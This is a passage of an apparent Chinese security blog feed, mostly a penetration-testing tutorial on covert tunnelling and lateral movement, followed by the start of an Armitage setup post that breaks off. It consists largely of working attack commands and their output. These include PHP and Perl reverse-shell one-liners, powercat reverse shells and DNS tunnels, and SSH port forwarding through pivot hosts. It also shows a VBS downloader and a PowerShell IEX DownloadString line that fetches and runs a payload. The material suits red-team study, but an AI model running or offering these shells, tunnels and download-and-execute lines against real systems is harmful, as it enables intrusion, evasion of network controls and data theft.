class="string">&#x27;$sock=fsockopen(&quot;192.168.1.11&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="04-Perl反弹shell"><a href="#04-Perl反弹shell" class="headerlink" title="04.Perl反弹shell"></a>04.Perl反弹shell</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.1.11&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4-powercat"><a href="#4-powercat" class="headerlink" title="4.powercat"></a>4.powercat</h3><p><code>Powershell版nc</code></p><p><code>参数</code></p><table><thead><tr><th><strong>参数</strong></th><th><strong>功能</strong></th></tr></thead><tbody><tr><td>-l</td><td>监听入站连接</td></tr><tr><td>-c</td><td>连接目标</td></tr><tr><td>-p</td><td>连接或监听的端口</td></tr><tr><td>-e</td><td>返回某个程序</td></tr><tr><td>-ep</td><td>返回PowerShel</td></tr><tr><td>-r</td><td>端口转发</td></tr><tr><td>-u</td><td>通过UDP隧道传输数据</td></tr><tr><td>-dns</td><td>通过DNS隧道传输数据</td></tr><tr><td>-dnsft</td><td>DNS失效阈值</td></tr><tr><td>-t</td><td>超时选项。默认值：60</td></tr><tr><td>-i</td><td>输入：文件路径（字符串）、字节数组或字符串</td></tr><tr><td>-o</td><td>控制台输出类型：“主机”、“字节”或“字符串”</td></tr><tr><td>-of</td><td>输出文件路径</td></tr><tr><td>-d</td><td>连接后断开</td></tr><tr><td>-rep</td><td>重新启动</td></tr><tr><td>-g</td><td>生成有效载荷</td></tr><tr><td>-ge</td><td>生成编码后的有效载荷</td></tr><tr><td>-h</td><td>帮助信息</td></tr></tbody></table><h4 id="01-Powercat生成payload"><a href="#01-Powercat生成payload" class="headerlink" title="01.Powercat生成payload"></a>01.Powercat生成payload</h4><h5 id="1-正向shell"><a href="#1-正向shell" class="headerlink" title="1.正向shell"></a>1.正向shell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -e cmd -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure><p><code>连接</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -v</span><br></pre></td></tr></table></figure><h5 id="2-反向shell"><a href="#2-反向shell" class="headerlink" title="2.反向shell"></a>2.反向shell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -e cmd -v -g &gt;&gt; demo.ps1</span><br></pre></td></tr></table></figure><p><code>连接</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -v</span><br></pre></td></tr></table></figure><h4 id="02-powercat-DNS隧道"><a href="#02-powercat-DNS隧道" class="headerlink" title="02.powercat DNS隧道"></a>02.powercat DNS隧道</h4><p><code>powercat DNS隧道是基于dnscat设计的，首先安装dnscat</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p><code>kali执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><p><code>目标主机执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.1.7 -p 53 -dns ttpowercat.test -e cmd.exe</span><br></pre></td></tr></table></figure><p><code>得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br><span class="line">unnamed 1&gt; </span><br><span class="line">unnamed 1&gt; </span><br><span class="line">C:\Users\Administrator&gt;whoami</span><br><span class="line">unnamed 1&gt; whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;</span><br></pre></td></tr></table></figure><h4 id="03-powercat作为跳板机"><a href="#03-powercat作为跳板机" class="headerlink" title="03.powercat作为跳板机"></a>03.powercat作为跳板机</h4><blockquote><p>环境简介：</p><p>3台机器。server 2019 能与win7和kali互通，kali与win7不能互通，server 2019作为跳板机使kali与win7互通</p></blockquote><p><code>win7执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 9999 -e cmd.exe    #本地监听9999端口</span><br></pre></td></tr></table></figure><p><code>server 2019执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 8888 -r tcp:10.10.10.20:9999    #本地监听8888端口并转发至10.10.10.20的9999端口</span><br></pre></td></tr></table></figure><p><code>kali</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc 192.168.1.5 8888 -vv</span><br><span class="line">192.168.1.5: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.1.5] 8888 (?) open</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">连接server 2019的8888端口就转发到了win7的9999端口</span></span><br></pre></td></tr></table></figure><p><code>使用DNS协议，与tcp数据流正好相反</code></p><p><code>server 2019</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 9999 -r dns:192.168.1.7::ttpowercat.test</span><br></pre></td></tr></table></figure><p><code>kali</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><p><code>win7</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 9999 -v -e cmd.exe</span><br></pre></td></tr></table></figure><p><code>kali得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is a console session!</span><br><span class="line"></span><br><span class="line">That means that anything you type will be sent as-is to the</span><br><span class="line">client, and anything they type will be displayed as-is on the</span><br><span class="line">screen! If the client is executing a command and you don&#x27;t</span><br><span class="line">see a prompt, try typing &#x27;pwd&#x27; or something!</span><br><span class="line"></span><br><span class="line">To go back, type ctrl-z.</span><br><span class="line"></span><br><span class="line">Microsoft Windows [???? 6.1.7601]</span><br><span class="line">???????? (c) 2009 Microsoft Corporation????????????????</span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;ipconfig</span><br><span class="line">unnamed 1&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP ????</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">???????????? ????????:</span><br><span class="line"></span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line">   ???????? IPv6 ????. . . . . . . . : fe80::f161:9ab3:b020:30f1%11</span><br><span class="line">   IPv4 ???? . . . . . . . . . . . . : 10.10.10.20</span><br><span class="line">   ????????  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   ????????. . . . . . . . . . . . . : 10.10.10.2</span><br><span class="line"></span><br><span class="line">?????????? isatap.&#123;40BE814B-BB9A-4845-AADE-41A6B9E99107&#125;:</span><br><span class="line"></span><br><span class="line">   ????????  . . . . . . . . . . . . : ??????????</span><br><span class="line">   ?????????? DNS ???? . . . . . . . : </span><br><span class="line"></span><br><span class="line">C:\Users\administrator&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-应用层隧道"><a href="#0x04-应用层隧道" class="headerlink" title="0x04.应用层隧道"></a>0x04.应用层隧道</h2><h3 id="1-ssh协议"><a href="#1-ssh协议" class="headerlink" title="1.ssh协议"></a>1.ssh协议</h3><p><code>参数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C：压缩传输，提高传输速率。</span><br><span class="line">-f：将SSH传输转入后台执行，不占用当前的shell。</span><br><span class="line">-N：建立静默连接（看不到具体会话）。</span><br><span class="line">-g：允许远程主机连接本地用于转发的端口。</span><br><span class="line">-L：本地端口转发。</span><br><span class="line">-R：远程端口转发。</span><br><span class="line">-D：动态转发（SOCKS代理）。</span><br><span class="line">-P：指定SSH端口。</span><br></pre></td></tr></table></figure><h4 id="01-本地端口转发"><a href="#01-本地端口转发" class="headerlink" title="01.本地端口转发"></a>01.本地端口转发</h4><blockquote><p>测试环境：</p><p>kali可以访问内网web服务器(cnetos 7)，不能访问数据库服务器(win7)，centos 7与win7可以相互访问</p></blockquote><p><code>web服务器为跳板，将win7的3389端口映射到kali的3309端口，访问kali的3309端口就可以访问win7d的3389</code></p><p><code>kali执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 3309:10.10.10.20:3389 root@192.168.1.11</span><br><span class="line">ssh -CfNg -L 3309&lt;本地端口&gt;:10.10.10.20:3389&lt;目标主机&gt; root@192.168.1.11&lt;跳板机&gt;</span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723170858890.png" class><h4 id="02-远程端口转发"><a href="#02-远程端口转发" class="headerlink" title="02.远程端口转发"></a>02.远程端口转发</h4><blockquote><p>测试环境：</p><p>kali不可以访问内网所有机器，内网web服务器(centos 7)可以访问kali，内网数据库(win7)不可以访问kali，内网全通。</p></blockquote><p><code>web为跳板机，将kali的3319端口的流量转发到目标主机win7的3389端口，访问kali的3319端口就可以访问win7的3389端口</code></p><p><code>web(centos 7执行)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3319:10.10.10.20:3389 root@192.168.1.7</span><br><span class="line">ssh -CfNg -R 3319&lt;远程主机kali端口&gt;:10.10.10.20:3389&lt;目标主机win7数据库&gt; root@192.168.1.7&lt;远程主机kali&gt;</span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3309</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210723172754616.png" class><blockquote><p>本地端口转发：</p><p>在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过ssh隧道转发到远端对应的端口</p><p>远程端口转发：</p><p>在远程主机上(服务器)监听一个端口，所有访问远程服务器指定端口的数据都会通过ssh隧道传输到本地对应的端口</p></blockquote><h3 id="2-HTTP-HTTPS协议"><a href="#2-HTTP-HTTPS协议" class="headerlink" title="2.HTTP/HTTPS协议"></a>2.HTTP/HTTPS协议</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3Jn">reGeorg工具<i class="fa fa-external-link-alt"></i></span></p><h3 id="3-DNS协议"><a href="#3-DNS协议" class="headerlink" title="3.DNS协议"></a>3.DNS协议</h3><p><code>此部分内容测试需要公网域名</code></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0Mg==">dnscat2<i class="fa fa-external-link-alt"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FsMWV4L2lvZGluZQ==">iodine<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x05-socks代理"><a href="#0x05-socks代理" class="headerlink" title="0x05.socks代理"></a>0x05.socks代理</h2><p>此部分内容测试需要公网ip与内网环境</p><h3 id="1-EarthWorm"><a href="#1-EarthWorm" class="headerlink" title="1.EarthWorm"></a>1.EarthWorm</h3><h3 id="2-ScoksCap64"><a href="#2-ScoksCap64" class="headerlink" title="2.ScoksCap64"></a>2.ScoksCap64</h3><h3 id="3-Proxychains"><a href="#3-Proxychains" class="headerlink" title="3.Proxychains"></a>3.Proxychains</h3><h2 id="0x06-压缩数据"><a href="#0x06-压缩数据" class="headerlink" title="0x06.压缩数据"></a>0x06.压缩数据</h2><p>渗透过程中常常要下载数据，这里有几种将数据进行压缩方便下载的技术</p><h3 id="1-RAR"><a href="#1-RAR" class="headerlink" title="1.RAR"></a>1.RAR</h3><p><code>这里提取出winrar下的rar.exe，参数如下：</code></p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-a</td><td>添加要压缩的文件</td></tr><tr><td>-k</td><td>锁定压缩文件</td></tr><tr><td>-s</td><td>生成存档文件（提高压缩比）</td></tr><tr><td>-p</td><td>指定压缩密码</td></tr><tr><td>-r</td><td>递归压缩，包括子目录</td></tr><tr><td>-x</td><td>指定要排除的文件</td></tr><tr><td>-v</td><td>分卷打包，大文件使用</td></tr><tr><td>-ep</td><td>从名称中排除路径</td></tr><tr><td>-ep1</td><td>从名称中排除基本目录</td></tr><tr><td>-m0</td><td>存储，添加到压缩文件时不压缩文件</td></tr><tr><td>-m1</td><td>最快</td></tr><tr><td>-m2</td><td>较快</td></tr><tr><td>-m3</td><td>标准</td></tr><tr><td>-m4</td><td>较好</td></tr><tr><td>-m5</td><td>最好</td></tr></tbody></table><h3 id="2-7-zip"><a href="#2-7-zip" class="headerlink" title="2.7-zip"></a>2.7-zip</h3><blockquote><p>这里提取7z.exe，参数如下</p></blockquote><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-r</td><td>递归压缩</td></tr><tr><td>-o</td><td>指定输出目录</td></tr><tr><td>-p</td><td>指定密码</td></tr><tr><td>-v</td><td>分卷压缩</td></tr><tr><td>a</td><td>添加压缩文件</td></tr></tbody></table><h2 id="0x07-上传下载"><a href="#0x07-上传下载" class="headerlink" title="0x07.上传下载"></a>0x07.上传下载</h2><p>对于不能上传shell，但是可以执行命令的windows服务器，可以进行上传和下载操作</p><h3 id="1-ftp协议上传下载"><a href="#1-ftp协议上传下载" class="headerlink" title="1.ftp协议上传下载"></a>1.ftp协议上传下载</h3><p><code>常用命令</code></p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>open &lt;服务器地址&gt;</td><td>链接服务器</td></tr><tr><td>cd &lt;目录名&gt;</td><td>进入指定目录</td></tr><tr><td>lcd &lt;文件夹路径&gt;</td><td>定位本地文件夹（上传文件的位置或者下载文件的本地位置）</td></tr><tr><td>type</td><td>查看当前的传输方式</td></tr><tr><td>ascii</td><td>设置传输方式为ascii码（TXT文件等）</td></tr><tr><td>binary</td><td>设置传输方式为二进制传输（EXE文件，图片，视频）</td></tr><tr><td>close</td><td>结束与ftp服务器的会话</td></tr><tr><td>quit</td><td>结束与ftp服务器的会话并退出ftp环境</td></tr><tr><td>put &lt;文件名&gt; [新的文件名]</td><td>上传，[]内容不指定则不修改</td></tr><tr><td>send &lt;文件名&gt; [新的文件名]</td><td>上传，[]内容不指定则不修改</td></tr><tr><td>get &lt;文件名&gt; [新的文件名]</td><td>下载，[]内容不指定则不修改</td></tr><tr><td>mget &lt;文件名&gt; [文件名…]</td><td>下载多个文件，支持空格和?通配符，如下载所有MP3文件：mget .mp3</td></tr></tbody></table><h3 id="2-vbs上传"><a href="#2-vbs上传" class="headerlink" title="2.vbs上传"></a>2.vbs上传</h3><blockquote><p>利用vbs上传主要使用msxm12.xmlhttp和adobd.stream对象，download.vbs文件：</p><p>使用echo 内容 &gt;&gt; download.vbs逐行写入后执行</p><p>Cscript download.vbs</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxm12.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://server_ip/target.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\Test\target.exe&quot;,2</span><br></pre></td></tr></table></figure><h3 id="3-Nishang上传"><a href="#3-Nishang上传" class="headerlink" title="3.Nishang上传"></a>3.Nishang上传</h3><blockquote><p>Nishang将上传的EXE文件转换为十六进制的形式然后用echo访问目标服务器最后使用Download_Execute脚本下载。<br>先利用Nishang中的exetotext.ps1脚本将Metasploit生成的msf.exe修改问msf.txt：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ ExetoText c\:msf.exe c:\msf.txt</span><br></pre></td></tr></table></figure><blockquote><p>接着通过echo将hex值添加到目标文件中，调用Download_Execute：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download_Execute http://server_ip/target.txt</span><br></pre></td></tr></table></figure><h3 id="4-Debug上传"><a href="#4-Debug上传" class="headerlink" title="4.Debug上传"></a>4.Debug上传</h3><h3 id="5-bitsadmin下载"><a href="#5-bitsadmin下载" class="headerlink" title="5.bitsadmin下载"></a>5.bitsadmin下载</h3><blockquote><p>bitsadmin不支持HTTPS和FTP，且在Windows XP/Server 2003及以前的版本无法使用，Windows7/8/10自带。</p></blockquote><h3 id="6-PowerShell下载"><a href="#6-PowerShell下载" class="headerlink" title="6.PowerShell下载"></a>6.PowerShell下载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(New-Object System.Net.Webclient).DownloadString(&#x27;https://server_ip/target.exe&#x27;);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-基础知识&quot;&gt;&lt;a href=&quot;#0x01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x01.基础知识&quot;&gt;&lt;/a&gt;0x01.基础知识&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;完成内网信息搜集后，需要先判断流量是否出得去、进得来。隐藏通信隧道技术常用于在访问受限的网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h3&gt;&lt;p&gt;​        在渗透场景中，各种安全设备会检查对外连接的情况，如果发现异常，就会对通信进行阻断。因此建立专门的隐蔽隧道就十分必要，这能绕过端口屏蔽。&lt;br&gt;常用的隧道如下：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;网络层隧道：IPv6、ICMP、GRE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;传输层隧道：TCP、UDP、常规端口转发&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;应用层隧道：SSH、HTTP、HTTPS、DNS&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Armitage</title>
    <link href="https://lunamoore.github.io/2021/07/19/Armitage/"/>
    <id>https://lunamoore.github.io/2021/07/19/Armitage/</id>
    <published>2021-07-19T09:33:15.000Z</published>
    <updated>2021-07-19T09:49:21.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Armitage"><a href="#Armitage" class="headerlink" title="Armitage"></a>Armitage</h1><h2 id="0x01-什么是Armitage"><a href="#0x01-什么是Armitage" class="headerlink" title="0x01.什么是Armitage"></a>0x01.什么是Armitage</h2><blockquote><p>Armitage 是一个用于<span class="exturl" data-url="aHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbS8=">Metasploit<i class="fa fa-external-link-alt"></i></span>的<span class="exturl" data-url="aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCM4">可编写脚本的<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCNtdWx0aQ==">红队协作<i class="fa fa-external-link-alt"></i></span>工具，可将目标可视化、推荐漏洞利用并公开框架中的高级后漏洞利用功能。</p><p>通过一个 Metasploit 实例，您的团队将：</p><ul><li>使用相同的会话</li><li>共享主机、捕获的数据和下载的文件</li><li>通过共享事件日志进行通信。</li><li>运行机器人以自动执行红队任务。</li></ul><p>Armitage 是<span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk">红队行动<i class="fa fa-external-link-alt"></i></span>的<span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk">力量倍增器<i class="fa fa-external-link-alt"></i></span>。</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS8=">Cobalt Strike<i class="fa fa-external-link-alt"></i></span>是用于<span class="exturl" data-url="aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA4LzAzL3JhcGhhZWxzLW1hZ2ljLXF1YWRyYW50Lw==">对手模拟<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA3LzA5L21vZGVscy1mb3ItcmVkLXRlYW0tb3BlcmF0aW9ucy8=">红队行动<i class="fa fa-external-link-alt"></i></span>的工具集。截至 2015 年 10 月，Cobalt Strike 不与 Armitage 共享代码，也不依赖于 Metasploit 框架。您可以使用 Armitage 通过 Metasploit 漏洞利用来触发 Cobalt Strike 的 Beacon 有效载荷。您还可以通过 Cobalt Strike Beacon 隧道传输 Metasploit 攻击。</p></blockquote><a id="more"></a><h2 id="0x02-安装使用"><a href="#0x02-安装使用" class="headerlink" title="0x02.安装使用"></a>0x02.安装使用</h2><p><code>首先进入armitage目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/armitage]</span><br><span class="line">└─# ./teamserver 192.168.1.7 pass</span><br><span class="line">[*] Generating X509 certificate and keystore (for SSL)</span><br><span class="line">[*] Starting RPC daemon</span><br><span class="line">[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg...</span><br><span class="line">[*] MSGRPC backgrounding at 2021-07-19 05:02:00 -0400...</span><br><span class="line">[*] MSGRPC background PID 8183</span><br><span class="line">[*] sleeping for 20s (to let msfrpcd initialize)</span><br><span class="line">[*] Starting Armitage team server</span><br><span class="line">[*] Use the following connection details to connect your clients:</span><br><span class="line">        Host: 192.168.1.7</span><br><span class="line">        Port: 55553</span><br><span class="line">        User: 